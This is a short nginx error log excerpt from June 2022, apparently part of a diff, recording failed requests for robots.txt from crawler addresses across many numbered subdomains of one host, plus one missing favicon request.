+2022/06/03 17:15:47 [error] 23#23: *1869 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.28, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.194019.dgphb.com"
+2022/06/03 17:18:31 [error] 23#23: *1872 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.25, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.161237.dgphb.com"
+2022/06/03 17:21:16 [error] 23#23: *1875 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.187, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.1883.dgphb.com"
+2022/06/03 17:24:06 [error] 23#23: *1878 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.106, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.4199.dgphb.com"
+2022/06/03 17:26:51 [error] 23#23: *1881 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.119, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.638.dgphb.com"
+2022/06/03 17:29:35 [error] 23#23: *1886 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.187, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.225948.dgphb.com"
+2022/06/03 17:32:19 [error] 23#23: *1889 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.220, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.33836.dgphb.com"
+2022/06/03 17:35:04 [error] 23#23: *1893 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.55, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.177189.dgphb.com"
+2022/06/03 17:37:48 [error] 23#23: *1896 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.62, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.3049.dgphb.com"
+2022/06/03 17:40:33 [error] 23#23: *1900 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.10, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.93407.dgphb.com"
+2022/06/03 17:43:18 [error] 23#23: *1901 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.129, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.94596.dgphb.com"
+2022/06/03 17:43:40 [error] 23#23: *1904 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.68.58, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.20775.dgphb.com"
+2022/06/03 17:46:03 [error] 23#23: *1907 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.225, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.239450.dgphb.com"
+2022/06/03 17:58:46 [error] 23#23: *1910 open() "/usr/share/nginx/html/favicon.ico" failed (2: No such file or directory), client: 223.73.212.201, server: localhost, request: "GET /favicon.ico HTTP/1.1", host: "159.75.219.167", referrer: "http://159.75.219.167/"
+2022/06/03 18:06:10 [error] 23#23: *1916 open() "/usr/share/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.79.121, server: localhost, request: "GET /robots.txt HTTP/1.1", host: "m.c6c6i.dgphb.com"
